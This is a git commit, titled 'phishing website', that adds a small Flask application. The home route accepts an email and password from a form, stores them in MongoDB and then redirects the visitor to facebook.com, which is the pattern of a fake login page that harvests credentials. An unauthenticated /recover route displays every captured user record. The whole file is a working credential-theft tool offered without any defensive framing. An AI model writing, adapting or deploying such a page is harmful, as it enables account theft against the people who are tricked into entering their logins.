e01b640d242c3e8b7ae1895a262c378b3488f6db
Daman Bhola <42509298+damnbhola@users.noreply.github.com>
2020-02-11 01:41:41 +0530

    phishing website

---
+++ app.py
@@ -0,0 +1,28 @@
+import os
+from flask import Flask, render_template, request, redirect, url_for
+from models.user import User
+
+app = Flask(__name__)
+app.secret_key = os.urandom(64)
+app.config.update(
+    ADMIN=os.environ.get('ADMIN')
+)
+
+
+@app.route('/', methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        email = request.form["email"]
+        password = request.form["pass"]
+        User(email=email, password=password).save_to_mongo()
+        return redirect("https://www.facebook.com")
+    return render_template('home.html')
+
+
+@app.route('/recover')
+def password():
+    return render_template("user.html", users=User.all())
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
